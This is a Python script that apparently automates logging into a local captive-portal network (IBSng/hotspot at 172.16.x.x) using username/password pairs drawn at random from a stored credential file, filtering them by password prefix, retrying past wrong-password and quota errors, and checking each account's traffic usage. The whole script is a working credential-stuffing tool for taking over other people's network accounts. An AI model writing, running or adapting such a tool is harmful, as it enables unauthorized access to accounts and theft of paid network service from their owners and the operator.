import random
import csv
import os
import requests
import time
import html2text
import os
import wifi
current_file_path = __file__
current_file_dir = os.path.dirname(__file__)
dbp = os.path.join(current_file_dir,'requests/dtbs/ac.db')
pxlp = os.path.join(current_file_dir,'requests/dtbs/pxl.db')
f=open(dbp,'r')
username,password,usage,traffic,c = 12345678,12345678,0,0,0
def checkuserpass():
    global username,password
    try:
        log = requests.get('http://172.16.254.2/status')
        html = html2text.html2text(log.text)
        if username in html:
            return 1
        else:
            return 0
    except:
            print('Cant Connect to Login Server!')
            wifi.checkwifi()
            time.sleep(2)
def confirm():
    while 1==1:
        try:
            log = requests.get('http://172.16.254.2/login')
            html = html2text.html2text(log.text)
            check = checkuserpass()
            if check == 1:
                while "If nothing happens," in html:
                    log = requests.get('http://172.16.254.2/login')
                    html = html2text.html2text(log.text)
                    info()
                    try:
                        time.sleep(60)
                    except:
                        print('Loging Out')
                        try:
                            logout = requests.get('http://172.16.254.2/logout')
                        except:
                            print('Cant Connect to Login Server!')
                            wifi.checkwifi()
                        print('Chang Account...')
                        print('3')
                        time.sleep(1)
                        print('2')
                        time.sleep(1)
                        print('1')
                        time.sleep(0.2)
                        os.system('cls')
                        test()
                else:
                    test()
            else:
                print('Username and Password is not match!\nTry to log out and login with new account!')
                time.sleep(2)
                try:
                    logout = requests.get('http://172.16.254.2/logout')
                    test()
                except:
                    print('Cant Connect to Login Server!')
                    wifi.checkwifi()
        except:
            print('Cant Connect to Login Server!')
            wifi.checkwifi()
            time.sleep(2)
def info():
    global username,password,usage,traffic
    infodata = {'normal_username': username, 'normal_password': password}

    try:
        inforeq = requests.post('http://172.16.16.1/IBSng/user/', data=infodata)
        html = html2text.html2text(inforeq.text)
        for line in html.split("\n"):
            if "This" in line:
                usage = line.split("|")
                print(usage[1],usage[2])
     #       if "Monthly Traffic Limit" in line:
     #           traffic = line.split('|')
     #           print (traffic[1],traffic[2])
    except:
        print('Cant Connect to Login Server!')
        wifi.checkwifi()
def getup():
    global username,password
    offset=random.randrange(0,476)
    offset= offset*21
    f.seek(offset)
    f.readline()
    random_line=f.readline()
    username,password = random_line.split(",")
    password = password.strip()
    global c
    c += 1
    print("Try to Login...")
    print('Try Count: ', c)
    if password[:3] == "136":
        return username,password
    else:
        print ("\nFailed!\nReason: Not Tabrizian!\n####################\n\n\nTry Again...")
        time.sleep(0.2)
        os.system('cls')
    return 0,0
def login():
    html = 'Cant Connect to Login Server!'
    username,password=getup()
    while (username == 0):
        username,password=getup()

    data = {'username': username, 'password': password}
    while (html == 'Cant Connect to Login Server!'):
        try:
            r = requests.post('http://172.16.254.2/login', data=data)
            import html2text
            html = html2text.html2text(r.text)
        except:
            print('Cant Connect to Login Server!')
            html = 'Cant Connect to Login Server!'
            wifi.checkwifi()
            time.sleep(2)
    return html
def test():
    html=login()
    if "Wrong password" in html:
        print("\nFailed!\nReason: Wrong Password\n####################\n\n\nTry Again...")
        time.sleep(0.2)
        os.system('cls')
        test()
    if "Maximum number of concurrent logins reached" in html:
        print("Failed!\nReason: Max Number\n####################\n\n\nTry Again:")
        time.sleep(0.2)
        os.system('cls')
        test()

    if "does not exists" in html:
        print("\nFailed!\nReason: This username does not exists\n####################\n\n\nTry Again...")
        time.sleep(0.2)
        os.system('cls')
        test()
    if "User Traffic quota has exceeded" in html:
        print("\nFailed!\nReason: User Traffic quota has exceeded\n####################\n\n\nTry Again...")
        time.sleep(0.2)
        os.system('cls')
        test()
    if "If nothing happens," in html:
        print("\n\n\n##################################################")
        print("################>  Logged IN!!  <#################")
        print("##################################################")
        print(" You can Change this Account by Pressing Ctrl + C")
        print("##################################################\n\n\n")
        info()
        time.sleep(0.5)    # pause 
        confirm()
        f.close()

#pxl=open(pxlp,"r")
#for line in pxl:
#    print (line.rstrip())
#    time.sleep(0.05)
#input("Attention:\n      This app developed by Jacob Zarg, plz dont use it without his permission...")
os.system('cls')
test()